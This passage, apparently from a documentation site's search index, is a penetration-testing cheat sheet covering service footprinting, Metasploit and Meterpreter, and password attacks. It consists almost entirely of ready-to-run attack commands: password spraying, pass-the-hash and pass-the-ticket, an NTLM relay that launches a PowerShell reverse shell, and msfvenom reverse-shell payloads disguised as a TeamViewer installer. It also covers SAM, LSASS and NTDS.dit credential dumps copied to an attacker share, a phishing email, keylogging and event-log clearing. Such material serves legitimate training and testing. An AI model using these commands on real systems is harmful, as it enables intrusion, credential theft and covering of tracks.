<pre><code>mkdir target-NFS\nsudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock\ncd target-NFS\ntree .\n</code></pre> <ol> <li>List Contents with Usernames &amp; Group Names: <code>ls -l mnt/nfs/</code></li> <li>List Contents with UIDs &amp; GUIDs: <code>ls -n mnt/nfs/</code></li> <li>Unmounting:<ol> <li><code>cd ..</code></li> <li><code>sudo umount ./target-NFS</code></li> </ol> </li> </ol>"},{"location":"footprinting/rdp/","title":"RDP","text":"<ol> <li>Nmap: <code>nmap -sV -sC 10.129.201.248 -p3389 --script rdp*</code></li> <li>rdp-sec-check<ol> <li><code>git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git &amp;&amp; cd rdp-sec-check</code></li> <li><code>./rdp-sec-check.pl 10.129.201.24</code> </li> </ol> </li> <li>Initiate an RDP Session<ol> <li><code>xfreerdp /u:cry0l1t3 /p:\"P455w0rd!\" /v:10.129.201.248</code></li> <li><code>xfreerdp /u:username /p:password /v:10.129.75.180 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution /drive:linux,/</code></li> </ol> </li> <li>Crowbar - RDP Password Spraying: <code>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'</code></li> <li>Hydra - RDP Password Spraying: <code>hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp</code></li> </ol>"},{"location":"footprinting/rdp/#rdp-session-hijacking","title":"RDP Session Hijacking","text":"<ol> <li>To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. It works by specifying which SESSION ID (4 for the lewen session in our example) we would like to connect to which session name (rdp-tcp#13, which is our current session): <code>tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}</code></li> <li>Escale privileges from local administrator to SYSTEM;<ol> <li><code>query user</code></li> <li><code>sc.exe create sessionhijack binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#13\"</code></li> <li><code>net start sessionhijack</code></li> </ol> </li> </ol>"},{"location":"footprinting/rdp/#rdp-pass-the-hash-pth","title":"RDP Pass-the-Hash (PtH)","text":"<ol> <li>Adding the DisableRestrictedAdmin Registry Key: <code>reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></li> <li>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access: <code>xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9</code></li> </ol>"},{"location":"footprinting/rservices/","title":"RSERVICES","text":"<ol> <li>Nmap: <code>sudo nmap -sV -p 512,513,514 10.0.17.2</code></li> <li>Logging in Using Rlogin: <code>rlogin 10.0.17.2 -l user-name</code></li> </ol>"},{"location":"footprinting/rsync/","title":"RSYNC","text":"<ol> <li>Nmap: <code>sudo nmap -sV -p 873 127.0.0.1</code></li> <li>Enumerating an Open Share: <code>rsync -av --list-only rsync://127.0.0.1/dev</code></li> </ol>"},{"location":"footprinting/smb/","title":"SMB","text":"<ol> <li>Nmap: <code>sudo nmap 10.129.14.128 -sV -sC -p139,445</code></li> <li>SMBclient     <code>bash     smbclient -N -L //10.129.14.128 # no logon     smbclient //10.129.14.128/notes # connecting to share</code></li> <li>Download Files: <code>get file_name</code></li> <li>Brute Forcing User RIDs: <ol> <li> <p><code>bash for i in $(seq 500 1100);do rpcclient -N -U \"\" 10.129.14.128 -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" &amp;&amp; echo \"\";done</code></p> </li> <li>You can use script from Impacket called samrdump.py alternatively: <code>samrdump.py 10.129.14.128</code></li> </ol> </li> <li>Crackmapexec: <ol> <li><code>crackmapexec smb 10.129.14.128 --shares -u '' -p ''</code></li> <li><code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth</code></li> <li><code>crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec</code></li> <li><code>crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users</code></li> <li><code>crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam</code></li> </ol> </li> <li>RPCclient:</li> </ol> <pre><code>rpcclient -U \"\" 10.129.14.128\nsrvinfo\nenumdomains\nquerydominfo\nnetshareenumall\nnetsharegetinfo notes\nenumdomusers\nqueryuser 0x3e9\nquerygroup 0x201\n</code></pre> <ol> <li>SMBMap:<ol> <li><code>smbmap -H 10.129.14.128</code></li> <li><code>smbmap -H 10.129.14.128 -r notes</code></li> <li><code>smbmap -H 10.129.14.128 --download \"notes\\note.txt\"</code></li> </ol> </li> <li>Enum4Linux:</li> </ol> <pre><code>git clone https://github.com/cddmp/enum4linux-ng.git\ncd enum4linux-ng\npip3 install -r requirements.txt\n./enum4linux-ng.py 10.129.14.128 -A\n</code></pre> <ol> <li>HYDRA <code>hydra -L user.list -P password.list smb://10.129.42.197</code></li> <li><code>impacket-psexec administrator:'Password123!'@10.10.110.17</code></li> </ol>"},{"location":"footprinting/smb/#pass-the-hash-pth","title":"Pass-the-Hash (PtH)","text":"<ol> <li><code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></li> </ol>"},{"location":"footprinting/smb/#hashcat-for-ntlmv2","title":"Hashcat for NTLMv2","text":"<ol> <li><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code></li> </ol>"},{"location":"footprinting/smb/#impacket-ntlmrelayx","title":"impacket-ntlmrelayx","text":"<ol> <li>Set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf): <code>cat /etc/responder/Responder.conf | grep 'SMB ='</code></li> <li>Execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t: <code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></li> <li>Create a PowerShell reverse shell using https://www.revshells.com/, set our machine IP address, port, and the option Powershell #3 (Base64).<code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JAB(..))'</code></li> </ol>"},{"location":"footprinting/smtp/","title":"SMTP","text":"<ol> <li>Nmap<ol> <li><code>sudo nmap 10.129.14.128 -sC -sV -p25</code></li> <li><code>sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v</code></li> </ol> </li> <li>Commands</li> </ol> <pre><code>AUTH PLAIN AUTH #is a service extension used to authenticate the client.                                  \nHELO #The client logs in with its computer name and thus starts the session.                        \nMAIL FROM #The client names the email sender.                                                            \nRCPT TO #The client names the email recipient.                                                         \nDATA #The client initiates the transmission of the email.                                           \nRSET #The client aborts the initiated transmission but keeps the connection between client and server.|\nVRFY #The client checks if a mailbox is available for message transfer.                             \nEXPN #The client also checks if a mailbox is available for messaging with this command.             \nNOOP #The client requests a response from the server to prevent disconnection due to time-out.      \nUSER # \nQUIT #The client terminates the session. \n</code></pre>"},{"location":"footprinting/smtp/#all-mail-services","title":"All mail services","text":"<ol> <li>Nmap scan: <code>sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128</code></li> <li>smtp-user-enum: <code>smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</code></li> <li>O365 Spray: <ol> <li><code>python3 o365spray.py --validate --domain msplaintext.xyz</code></li> <li><code>python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz</code></li> </ol> </li> <li>Hydra - Password Attack: <code>hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3</code></li> <li>O365 Spray - Password Spraying: <code>python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz</code></li> <li>Open Relay: <code>nmap -p25 -Pn --script smtp-open-relay 10.10.11.213</code></li> <li>use any mail client to connect to the mail server and send our email: <code>swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213</code></li> </ol>"},{"location":"footprinting/snmp/","title":"SNMP","text":"<ol> <li>SNMPwalk: <code>snmpwalk -v2c -c public 10.129.14.128</code></li> <li>OneSixtyOne: <ol> <li><code>sudo apt install onesixtyone</code></li> <li><code>onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128</code></li> </ol> </li> <li>Braa:<ol> <li><code>sudo apt install braa</code></li> <li><code>braa &lt;community string&gt;@&lt;IP&gt;:.1.3.6.*   # Syntax</code></li> <li><code>braa public@10.129.14.128:.1.3.6.* # example</code></li> </ol> </li> </ol>"},{"location":"footprinting/ssh/","title":"SSH","text":"<ol> <li>SSH audit<ol> <li><code>git clone https://github.com/jtesta/ssh-audit.git &amp;&amp; cd ssh-audit</code></li> <li><code>./ssh-audit.py 10.129.14.132</code></li> </ol> </li> </ol>"},{"location":"footprinting/tns/","title":"ORACLE TNS","text":"<ol> <li>Nmap<ol> <li><code>sudo nmap -p1521 -sV 10.129.204.235 --open</code></li> <li><code>sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute</code></li> </ol> </li> <li>odat.py <code>./odat.py all -s 10.129.204.235</code></li> <li>SQLplus - for log In: <code>sqlplus scott/tiger@10.129.204.235/XE</code></li> <li>SQLplus commands</li> </ol>"},{"location":"footprinting/winrm/","title":"WinRM","text":"<ol> <li>Nmap: <code>nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n</code></li> </ol>"},{"location":"footprinting/wmi/","title":"Wmi","text":"<ol> <li>wmiexec.py <code>usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:\"P455w0rD!\"@10.129.201.248 \"hostname\"</code></li> </ol>"},{"location":"metasploit/metasploit/","title":"Metasploit","text":"<ol> <li>Show all exploits within the Framework.: <code>show exploits</code></li> <li>Show all payloads within the Framework.: <code>show payloads</code></li> <li>Show all auxiliary modules within the Framework.: <code>show auxiliary</code></li> <li>Search for exploits or modules within the Framework.: <code>search &lt;name&gt;</code></li> <li>Load information about a specific exploit or module.: <code>info</code></li> <li>Load an exploit or module (example: use windows/smb/psexec).: <code>use &lt;name&gt;</code></li> <li>Load an exploit by using the index number displayed after the search\u00a0command.: <code>use &lt;number&gt;</code></li> <li>Your local host\u2019s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.: <code>LHOST</code></li> <li>The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).: <code>RHOST</code></li> <li>Set a specific value globally (for example, LHOST or RHOST).: <code>setg &lt;function&gt;</code></li> <li>Show the options available for a module or exploit.: <code>show options</code></li> <li>Show the platforms supported by the exploit.: <code>show targets</code></li> <li>Specify a specific target index if you know the OS and service pack.: <code>set target &lt;number&gt;</code></li> <li>Specify the payload to use.: <code>set payload &lt;payload&gt;</code></li> <li>Specify the payload index number to use after the show payloads command.: <code>set payload &lt;number&gt;</code></li> <li>Show advanced options.: <code>show advanced</code></li> <li>Automatically migrate to a separate process upon exploit completion.: <code>set autorunscript migrate -f</code></li> <li>Determine whether a target is vulnerable to an attack.: <code>check</code></li> <li>Execute the module or exploit and attack the target.: <code>exploit</code></li> <li>Run the exploit under the context of the job. (This will run the exploit in the background.): <code>exploit -j</code></li> <li>Do not interact with the session after successful exploitation.: <code>exploit -z</code></li> <li>Specify the payload encoder to use (example: exploit \u2013e shikata_ga_nai).: <code>exploit -e &lt;encoder&gt;</code></li> <li>Display help for the exploit command.: <code>exploit -h</code></li> <li>List available sessions (used when handling multiple shells).: <code>sessions -l</code></li> <li>List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system.: <code>sessions -l -v</code></li> <li>Run a specific Meterpreter script on all Meterpreter live sessions.: <code>sessions -s &lt;script&gt;</code></li> <li>Kill all live sessions.: <code>sessions -K</code></li> <li>Execute a command on all live Meterpreter sessions.: <code>sessions -c &lt;cmd&gt;</code></li> <li>Upgrade a normal Win32 shell to a Meterpreter console.: <code>sessions -u &lt;sessionID&gt;</code></li> <li>Create a database to use with database-driven attacks (example: db_create autopwn).: <code>db_create &lt;name&gt;</code></li> <li>Create and connect to a database for driven attacks (example: db_connect autopwn).: <code>db_connect &lt;name&gt;</code></li> <li>Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as \u2013sT \u2013v \u2013P0.): <code>db_nmap</code></li> <li>Delete the current database.: <code>db_destroy</code></li> <li>Delete database using advanced options.: <code>db_destroy &lt;user:password@host:port/database&gt;</code></li> </ol>"},{"location":"metasploit/metasploit/#meterpreter","title":"Meterpreter","text":"<ol> <li>Open Meterpreter usage help.: <code>help</code></li> <li>Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.: <code>run &lt;scriptname&gt;</code></li> <li>Show the system information on the compromised target.: <code>sysinfo</code></li> <li>List the files and folders on the target.: <code>ls</code></li> <li>Load the privilege extension for extended Meterpreter libraries.: <code>use priv</code></li> <li>Show all running processes and which accounts are associated with each process.: <code>ps</code></li> <li>Migrate to the specific process ID (PID is the target process ID gained from the ps command).: <code>migrate &lt;proc. id&gt;</code></li> <li>Load incognito functions. (Used for token stealing and impersonation on a target machine.): <code>use incognito</code></li> <li>List available tokens on the target by user.: <code>list_tokens -u</code></li> <li>List available tokens on the target by group.: <code>list_tokens -g</code></li> <li>Impersonate a token available on the target.: <code>impersonate_token &lt;DOMAIN_NAMEUSERNAME&gt;</code></li> <li>Steal the tokens available for a given process and impersonate that token.: <code>steal_token &lt;proc. id&gt;</code></li> <li>Stop impersonating the current token.: <code>drop_token</code></li> <li>Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.: <code>getsystem</code></li> <li>Drop into an interactive shell with all available tokens.: <code>shell</code></li> <li>Execute cmd.exe and interact with it.: <code>execute -f &lt;cmd.exe&gt; -i</code></li> <li>Execute cmd.exe with all available tokens.: <code>execute -f &lt;cmd.exe&gt; -i -t</code></li> <li>Execute cmd.exe with all available tokens and make it a hidden process.: <code>execute -f &lt;cmd.exe&gt; -i -H -t</code></li> <li>Revert back to the original user you used to compromise the target.: <code>rev2self</code></li> <li>Interact, create, delete, query, set, and much more in the target\u2019s registry.: <code>reg &lt;command&gt;</code></li> <li>Switch to a different screen based on who is logged in.: <code>setdesktop &lt;number&gt;</code></li> <li>Take a screenshot of the target\u2019s screen.: <code>screenshot</code></li> <li>Upload a file to the target.: <code>upload &lt;filename&gt;</code></li> <li>Download a file from the target.: <code>download &lt;filename&gt;</code></li> <li>Start sniffing keystrokes on the remote target.: <code>keyscan_start</code></li> <li>Dump the remote keys captured on the target.: <code>keyscan_dump</code></li> <li>Stop sniffing keystrokes on the remote target.: <code>keyscan_stop</code></li> <li>Get as many privileges as possible on the target.: <code>getprivs</code></li> <li>Take control of the keyboard and/or mouse.: <code>uictl enable &lt;keyboard/mouse&gt;</code></li> <li>Run your current Meterpreter shell in the background.: <code>background</code></li> <li>Dump all hashes on the target. use sniffer Load the sniffer module.: <code>hashdump</code></li> <li>List the available interfaces on the target.: <code>sniffer_interfaces</code></li> <li>Start sniffing on the remote target.: <code>sniffer_dump &lt;interfaceID&gt; pcapname</code></li> <li>Start sniffing with a specific range for a packet buffer.: <code>sniffer_start &lt;interfaceID&gt; packet-buffer</code></li> <li>Grab statistical information from the interface you are sniffing.: <code>sniffer_stats &lt;interfaceID&gt;</code></li> <li>Stop the sniffer.: <code>sniffer_stop &lt;interfaceID&gt;</code></li> <li>Add a user on the remote target.: <code>add_user &lt;username&gt; &lt;password&gt; -h &lt;ip&gt;</code></li> <li>Add a username to the Domain Administrators group on the remote target.: <code>add_group_user &lt;\"Domain Admins\"&gt; &lt;username&gt; -h &lt;ip&gt;</code></li> <li>Clear the event log on the target machine.: <code>clearev</code></li> <li>Change file attributes, such as creation date (antiforensics measure).: <code>timestomp</code></li> <li>Reboot the target machine.: <code>reboot</code></li> </ol>"},{"location":"metasploit/metasploit/#encoders","title":"Encoders","text":"<ol> <li>Selecting an Encoder <code>msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\\x00' -f perl -e x86/shikata_ga_nai</code></li> <li>Generating Payload - Without Encoding: <code>msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b \"\\x00\" -f perl</code></li> <li>Generating Payload - With Encoding: <code>msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b \"\\x00\" -f perl -e x86/shikata_ga_nai</code></li> <li>Generating Payload - Without Encoding: <code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe</code></li> <li>Generating Payload - With Encoding: <code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe</code></li> </ol>"},{"location":"metasploit/metasploit/#msfvenom","title":"MSFVenom","text":"<ol> <li>Generating Payload: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx &gt; reverse_shell.aspx</code></li> <li>Generating Payload:<code>msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5</code></li> </ol>"},{"location":"passwords/passwords/","title":"Passwords Attack","text":""},{"location":"passwords/passwords/#connecting-to-target","title":"Connecting to Target","text":"<ol> <li>Uses Evil-WinRM to establish a Powershell session with a target: <code>evil-winrm -i &lt;ip&gt; -u user -p password</code></li> <li>Uses smbclient to connect to an SMB share using a specified user: <code>smbclient -U user \\\\\\\\&lt;ip&gt;\\\\SHARENAME</code></li> <li>Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host: <code>python3 smbserver.py -smb2support CompData /home/&lt;nameofuser&gt;/Documents/</code></li> </ol>"},{"location":"passwords/passwords/#password-mutations","title":"Password Mutations","text":"<ol> <li>Uses cewl to generate a wordlist based on keywords present on a website: <code>cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist</code></li> <li>Uses Hashcat to generate a rule-based word list: <code>hashcat --force password.list -r custom.rule --stdout &gt; mut_password.list</code></li> <li>Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username: <code>./username-anarchy -i /path/to/listoffirstandlastnames.txt</code></li> <li>Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords: <code>curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep \"\\.\" | tee -a compressed_ext.txt</code></li> </ol>"},{"location":"passwords/passwords/#attacking-sam","title":"Attacking SAM","text":"<ol> <li>Using reg.exe save to Copy Registry Hives:<ol> <li><code>reg.exe save hklm\\sam C:\\sam.save</code></li> <li><code>reg.exe save hklm\\system C:\\system.save</code></li> <li><code>reg.exe save hklm\\security C:\\security.save</code></li> </ol> </li> <li>Creating a Share with smbserver.py: <code>sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/</code></li> <li>Moving Hive Copies to Share: <ol> <li><code>move sam.save \\\\10.10.15.16\\CompData</code></li> <li><code>move security.save \\\\10.10.15.16\\CompData</code></li> <li><code>move system.save \\\\10.10.15.16\\CompData</code></li> </ol> </li> <li>Dumping Hashes with Impacket's secretsdump.py: <code>ython3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</code></li> <li>Running Hashcat against NT Hashes: <code>sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt</code></li> </ol>"},{"location":"passwords/passwords/#remote-dumping-lsa-secrets-considerations","title":"Remote Dumping &amp; LSA Secrets Considerations","text":"<p>With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network. 1. Dumping LSA Secrets Remotely: <code>crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</code> 2. Dumping SAM Remotely: <code>crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</code></p>"},{"location":"passwords/passwords/#dumping-lsass-process-memory","title":"Dumping LSASS Process Memory","text":""},{"location":"passwords/passwords/#task-manager-method","title":"Task Manager Method","text":"<ol> <li>Open Task Manager &gt; Select the Processes tab &gt; Find &amp; right click the Local Security Authority Process &gt; Select Create dump file</li> <li>A file called lsass.DMP is created and saved in: <code>C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp</code></li> </ol>"},{"location":"passwords/passwords/#rundll32exe-comsvcsdll-method","title":"Rundll32.exe &amp; Comsvcs.dll Method","text":"<ol> <li>Finding LSASS PID in cmd: <code>tasklist /svc</code></li> <li>Finding LSASS PID in PowerShell: <code>Get-Process lsass</code></li> <li>Creating lsass.dmp using PowerShell: <code>rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full</code></li> </ol>"},{"location":"passwords/passwords/#using-pypykatz-to-extract-credentials","title":"Using Pypykatz to Extract Credentials","text":"<ol> <li>Running Pypykatz: <code>pypykatz lsa minidump /home/peter/Documents/lsass.dmp</code></li> </ol>"},{"location":"passwords/passwords/#attacking-active-directory-ntdsdit","title":"Attacking Active Directory &amp; NTDS.dit","text":"<ol> <li>Use anrchy to convert real names into common username formats: <code>./username-anarchy -i /home/ltnbob/names.txt</code></li> <li>Launching the Attack with CrackMapExec: <code>crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt</code></li> </ol>"},{"location":"passwords/passwords/#capturing-ntdsdit","title":"Capturing NTDS.dit","text":"<ol> <li>Connecting to a DC with Evil-WinRM: <code>evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'</code></li> <li>Checking Local Group Membership: <code>net localgroup</code></li> <li>Checking User Account Privileges including Domain: <code>net user bwilliamson</code></li> <li>Creating Shadow Copy of C: <code>vssadmin CREATE SHADOW /For=C:</code></li> <li>Copying NTDS.dit from the VSS: <code>cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit</code></li> <li>Transferring NTDS.dit to Attack Host: <code>cmd.exe /c move C:\\NTDS\\NTDS.dit \\\\10.10.15.30\\CompData</code></li> <li>A Faster Method: Using cme to Capture NTDS.dit: <code>crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds</code></li> <li>Cracking a Single Hash with Hashcat: <code>sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt</code></li> <li>Pass-the-Hash Considerations: <code>evil-winrm -i 10.129.201.57  -u  Administrator -H \"64f12cddaa88057e06a81b54e73b949b\"</code></li> </ol>"},{"location":"passwords/passwords/#credential-hunting-in-windows","title":"Credential Hunting in Windows","text":"<ol> <li>Running Lazagne All: <code>start lazagne.exe all</code></li> <li>Using findstr: <code>findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</code></li> </ol>"},{"location":"passwords/passwords/#credential-hunting-in-linux","title":"Credential Hunting in Linux","text":"<ol> <li>Configuration Files: <code>for l in $(echo \".conf .config .cnf\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"lib\\|fonts\\|share\\|core\" ;done</code></li> <li>Credentials in Configuration Files: <code>for i in $(find / -name *.cnf 2&gt;/dev/null | grep -v \"doc\\|lib\");do echo -e \"\\nFile: \" $i; grep \"user\\|password\\|pass\" $i 2&gt;/dev/null | grep -v \"\\#\";done</code></li> <li>Databases: <code>for l in $(echo \".sql .db .*db .db*\");do echo -e \"\\nDB File extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\\|man\";done</code></li> <li>Notes: <code>find /home/* -type f -name \"*.txt\" -o ! -name \"*.*\"</code></li> <li>Scripts: <code>for l in $(echo \".py .pyc .pl .go .jar .c .sh\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\";done</code></li> <li>Cronjobs: <code>cat /etc/crontab</code>, <code>ls -la /etc/cron.*/</code></li> <li>SSH Private Keys: <code>grep -rnw \"PRIVATE KEY\" /home/* 2&gt;/dev/null | grep \":1\"</code></li> <li>SSH Public Keys: <code>grep -rnw \"ssh-rsa\" /home/* 2&gt;/dev/null | grep \":1\"</code></li> <li>Bash History: <code>tail -n5 /home/*/.bash*</code></li> <li>Logs: <code>for i in $(ls /var/log/* 2&gt;/dev/null);do GREP=$(grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null); if [[ $GREP ]];then echo -e \"\\n#### Log file: \" $i; grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null;fi;done</code></li> <li>Memory - Mimipenguin: <ol> <li><code>sudo python3 mimipenguin.py</code></li> <li><code>sudo bash mimipenguin.sh</code></li> </ol> </li> <li>Memory - LaZagne: <code>sudo python2.7 laZagne.py all</code></li> <li>Firefox Stored Credentials:<ol> <li><code>ls -l .mozilla/firefox/ | grep default</code></li> <li><code>cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .</code></li> </ol> </li> <li>Decrypting Firefox Credentials: <code>python3.9 firefox_decrypt.py</code></li> <li>Browsers - LaZagne: <code>python3 laZagne.py browsers</code></li> </ol>"},{"location":"passwords/passwords/#cracking-linux-credentials","title":"Cracking Linux Credentials","text":"<ol> <li>Unshadow:<ol> <li><code>sudo cp /etc/passwd /tmp/passwd.bak</code></li> <li><code>sudo cp /etc/shadow /tmp/shadow.bak</code></li> <li><code>unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes</code></li> </ol> </li> <li>Hashcat - Cracking Unshadowed Hashes: <code>hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked</code></li> <li>Hashcat - Cracking MD5 Hashes: <code>hashcat -m 500 -a 0 md5-hashes.list rockyou.txt</code></li> </ol>"},{"location":"passwords/passwords/#pass-the-hash-pth","title":"Pass the Hash (PtH)","text":"<ol> <li>Pass the Hash from Windows Using Mimikatz: <code>mimikatz.exe privilege::debug \"sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe\" exit</code></li> <li>Pass the Hash with PowerShell Invoke-TheHash (Windows): <ol> <li>Invoke-TheHash with SMB:<ol> <li><code>Import-Module .\\Invoke-TheHash.psd1</code></li> <li><code>Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command \"net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add\" -Verbose</code></li> <li>Netcat Listener: <code>.\\nc.exe -lvnp 8001</code></li> <li>Visit https://www.revshells.com/, set IP 172.16.1.5 and port 8001, and select the option PowerShell #3 (Base64)</li> <li><code>Import-Module .\\Invoke-TheHash.psd1</code></li> <li><code>Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command \"powershell -e JABjAG(...))\"</code></li> </ol> </li> </ol> </li> </ol>"},{"location":"passwords/passwords/#pass-the-hash-with-impacket-linux","title":"Pass the Hash with Impacket (Linux)","text":"<ol> <li>Pass the Hash with Impacket PsExec: <code>impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453</code></li> <li>Pass the Hash with CrackMapExec (Linux): <code>crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453</code></li> <li>CrackMapExec - Command Execution: <code>crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami</code></li> <li>Pass the Hash with evil-winrm (Linux): <code>evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453</code></li> <li>Pass the Hash with RDP (Linux): <ol> <li>Enable Restricted Admin Mode to Allow PtH: <code>reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></li> <li>Pass the Hash Using RDP: <code>xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B</code></li> </ol> </li> </ol>"},{"location":"passwords/passwords/#pass-the-ticket-ptt-from-windows","title":"Pass the Ticket (PtT) from Windows","text":"<ol> <li>Mimikatz - Export Tickets:<ol> <li><code>privilege::debug</code></li> <li><code>sekurlsa::tickets /export</code></li> <li><code>dir *.kirbi</code></li> </ol> </li> <li>Rubeus - Export Tickets: <code>Rubeus.exe dump /nowrap</code></li> <li>Mimikatz - Extract Kerberos Keys:<ol> <li><code>privilege::debug</code></li> <li><code>sekurlsa::ekeys</code></li> </ol> </li> <li>Mimikatz - Pass the Key or OverPass the Hash: <ol> <li><code>privilege::debug</code></li> <li><code>sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f</code></li> </ol> </li> <li>Rubeus - Pass the Key or OverPass the Hash: <code>Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext 